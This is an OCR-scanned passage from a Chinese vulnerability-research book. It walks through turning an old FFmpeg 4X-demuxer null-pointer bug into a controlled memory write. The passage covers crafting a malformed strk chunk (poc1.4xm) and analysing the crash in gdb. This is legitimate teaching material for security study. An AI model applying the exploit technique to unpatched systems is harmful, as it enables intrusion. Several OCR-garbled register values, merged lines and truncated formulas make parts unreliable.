文件下载之后，我把它重命名为original.4xmo
4.2.2第二步：了解这个strk块的布局
按照4X电影文件格式的描述，一个strk块有以下结构：
bytes 0-3
fourcc:'strk'
bytes4-7
lengthof strk structure（40or0x28bytes)
bytes 8-11track number
bytes 12-15 audio type:0=PCM, 1 = 4X IMA ADPCM
bytes16-35unknown
bytes 36-39number of audio channels
---
## Page 71
56第4章空指针万岁
bytes 40-43audio samplerate
bytes 44-47 audio sample resolution(8 or 16bits)
下载的样例文件的strk块从文件偏移0x1a6处开始，如图4-4所示。
&header[]
(2)
(2)
(3)
000001a0h:32 2E77 61 760073 74 72 6B28 00 00000000;2.waV.strk（.
00200000000000000000000000000:409100000
(4)
图4-4下载的4X样例电影文件的strk块。图中的数字在表4-1中提及
表4-1描述了图4-4显示的strk块布局。
表4-1图4-4显示的strk块布局构成
引用编号
数据头偏移
描
述
(1)
&header[i]
四字符代码strk
(2)
&header[1+4]
strk结构的大小（ox28字节）
(3)
&header[i+8]
tracknumber（这是FFmpeg源代码里的current_track变量）
(4)
&header[i+12]
audiotype（这就是写人第一处内存解引l用的值）
为了利用这个漏洞，我知道需要设置&header[i+8]处的tracknumber值（对
应FFmpeg源代码里的current_track变量）和&header[i+12]处的audiotype值。
如果正确设置了数值，audiotype的值会写到NULL+tracknumber的内存位置，
也就是NULL+current_track的值。
总的来说，FFmpeg源代码里（近乎）随意的内存写操作如下。
[..]
178
fourxm->tracks[current_track].adpcm=AV_RL32(&header[i+12]);
179
fourxm->tracks[current_track].channels=Av_RL32(&header[i+36]);
180
fourxm->tracks[current_track].sample_rate=AV_RL32(&header[i+40]);
181
fourxm->tracks[current_track].bits=AV_RL32(&header[i+44]);
[..]
每一行对应下面这样的伪代码。
NULL[user_controlled_value].offset = user_controlled_data;
---
## Page 72
4.2漏洞利用57
4.2.3第三步：修改这个strk块以使
编译FFmpeg：
FFmpeg崩溃
linux$ ./configure; make
这些命令将会编译两个不同
编译了FFmpeg带有漏洞的16556版本源
的FFmPeg二进制版本：
代码之后，我尝试着把这个4X电影文件转换
FfmPeg.不带调试符号
的二进制程序
为AVI文件，以确认编译成功、FFmpeg可以完
FfMPe9-9，带有调试特
美地工作。
号的二进制程序
linux$./ffmpeg_g-ioriginal.4xm original.avi
FFmpeg version SVN-r16556,Copyright (c)2000-2009 Fabrice Bellard,et al.
configuration:
libavutil
49.12.0/ 49.12.0
libavcodec
52.10.0/52.10.0
libavformat
52.23.1/ 52.23.1
libavdevice
52.1.0/52.1.0
built on Jan 242009 02:30:50,gcc: 4.3.3
Input #0,4xm,from‘original.4xm':
Duration:00:00:13.20,start:0.000000,bitrate:704 kb/s
Stream #0.0:Video:4xm，rgb565,640x480，15.00 tb(r)
Stream #0.1:Audio:pcm_s161e，22050 Hz, stere0,s16,705 kb/s
Output #o，avi，to'original.avi':
Stream#0.0:Video:mpeg4,yuv420p，640x480,q=2-31,200kb/s,15.00 tb(c)
Stream #0.1:Audio:mp2,22050 Hz，stere0，s16，64kb/s
Stream mapping:
Stream#0.0->#0.0
Stream #0.1->#0.1
Press [q]to stop encoding
frame=
47fps=0q=2.3Lsize=
194kB time=3.08 bitrate= 515.3kbits/s
video:158kBaudio:24kB globalheaders:0kBmuxing overhead 6.715897%
接下来，我修改了样例文件的strk块中tracknumber和audiotype的
数值。
如图4-5所示，我把tracknumber的值改为0xaaaaaaaa（1），audiotype的
值改为oxbbbbbbbb（2)。新文件命名为poc1.4xm，然后尝试用FFmpeg来转换它
（以下调试命令的描述见B.4节）。
&header[i]
个
(2)
000001a0h:32 2E 7761 76 0073 74726B 28 00 00 00AA AA;2.wav.strk(...
000001boh:AAAABBBBBBBB0000 0400D10700002F00;#*...N....
(2)
图4-5修改后的样例文件strk块。所做的改动已高亮显示并加框
标示的数字即上文提到的数字
---
## Page 73
58第4章空指针万岁
linux$ gdb./ffmpeg_g
GNU gdb6.8-debian
Copyright (C)2o08Free Software Foundation,Inc.
License GPLv3+:GNU GPL version 3or later
Thisis freesoftware:you arefree tochange andredistribute it.
There is NO WARRANTY， to the extent permitted by law.Type"show copying'
and "show warranty" for details.
This GDB was configured as "i486-linux-gnu"...
(gdb)set disassembly-flavor intel
（gdb)run-i poc1.4xm
Startingprogram:/home/tk/BHD/ffmpeg/ffmpeg_g-ipoc1.4xm
FFmpeg version SVN-r16556,Copyright (c) 2000-2009 Fabrice Be1lard,et al.
configuration:
libavutil
49.12.0/49.12.0
libavcodec
52.10.0/52.10.0
libavformat
52.23.1/52.23.1
libavdevice
52.1.0/52.1.0
built on Jan 242009 02:30:50,gcc: 4.3.3
Program received signal SIGSEGV,Segmentation fault.
0x0809c89din fourxm_read_header(s=0x8913330,ap=0xbf8b6c24)at
libavformat/4xm.c:178
178
fourxm->tracks[current_track].adpcm=AV_RL32(&header[i+12]);
不出所料，FFmpeg因段错误在源代码第178行崩溃。我在调试器中进一步分
析FFmpeg进程，看看究竟是什么导致了崩溃。
(gdb)info registers
eax
q999999qxo
-1145324613
ecx
0x891c400
143770624
edx
0x0
0
ebx
-1431655766
esp
0xbf8b6aa0
oxbf8b6aa0
ebp
0x55555548
0x55555548
esi
0x891c3c0
143770560
edi
0x891c340
143770432
eip
0x809c89d
ox809c89d
eflags
0x10207
[CF PF IF RF]
CS
0x73
115
SS
0x7b
123
ds
0x7b
123
es
0x7b
123
fs
0x0
gs
EEXO
51
崩溃发生时，寄存器EAx和EBx填人了我输人的audiotype值（oxbbbbbbbb）
和tracknumber值（oxaaaaaaaa）。接下来，我让调试器显示FFmpeg执行的最后
一条指令。
---
## Page 74
4.2漏洞利用59
(gdb）x/1i$eip
0x809c89d:
mov
DWORD PTR[edx+ebp*1+0x10],eax
如调试器输出所示，导致段错误的指令正试图将值oxbbbbbbbb写人基于我的
tracknumber计算得到的--个地址。
为了控制内存写操作，我需要知道写操作的目标地址是怎么计算出来的。从
下面这段汇编代码里我找到了答案。
（gdb）x/7i$eip-21
0x809c888:
lea
ebp,[ebx+ebx*4]
0x809c88b:
mov
eax,DWORD PTR[eSp+Ox34]
0x809c88f:
mov
edx,DWORD PTR[esi+Ox10]
0x809c892:
mov
DWORD PTR [eSp+0x28],ebp
0x809c896:
sh1
ebp,0x2
0x809c899:
mov
eax,DWORD PTR[ecx+eax*1+Oxc]
0x8o9c89d:
mov
DWORD PTR[edx+ebp*1+0x10],eax
这些指令对应下面的C源代码。
[..]
178
fourxm->tracks[current_track].adpcm=AV_RL32(&header[i+12]);
[..]
表4-2解释了这些指令的结果。
表4-2汇编指令及每条指令的结果清单
指
令
结
果
lea ebp,[ebx+ebx*4]
ebp=ebx+ebx*4（EBx寄存器里存放的是用户定义的
current_track值（oxaaaaaaaa）)
mov eax,DwORD PTR[esp+0x34]
eax = array index i
mov edx,DWORD PTR[esi+Ox10]
edx=fourxm->tracks
shl ebp,0x2
ebp = ebptracks[current_track].adpcm= eax; or
[edx+ebp*1+0x10],eax
edx[ebp+0x10]=eax;
因为EBX寄存器里的值是我提供给变量current_track的，EDx寄存器里的值
是fourxm->tracks这个空指针，上面这个计算可以表示为：
edx+((ebx+ebx*4)nb_streams >= MAX_STREAMS)
2277
return NULL;
2278
2279
st=av_mallocz(sizeof(AvStream));
[..]
第2279行，调用了另一个名为av_mallocz（)的函数。
源代码文件libavutil/mem.c
函数av_mallocz（）和av_malloc()
[..]
43 void *av_malloc（unsigned int size)
44{
45
void *ptr =NULL;
46
#ifdef CONFIG_MEMALIGN_HACK
47
long diff;
48 #endif
49
50
/*let's disallow possible ambiguous cases */
51
if(size>（INT_MAX-16）)
52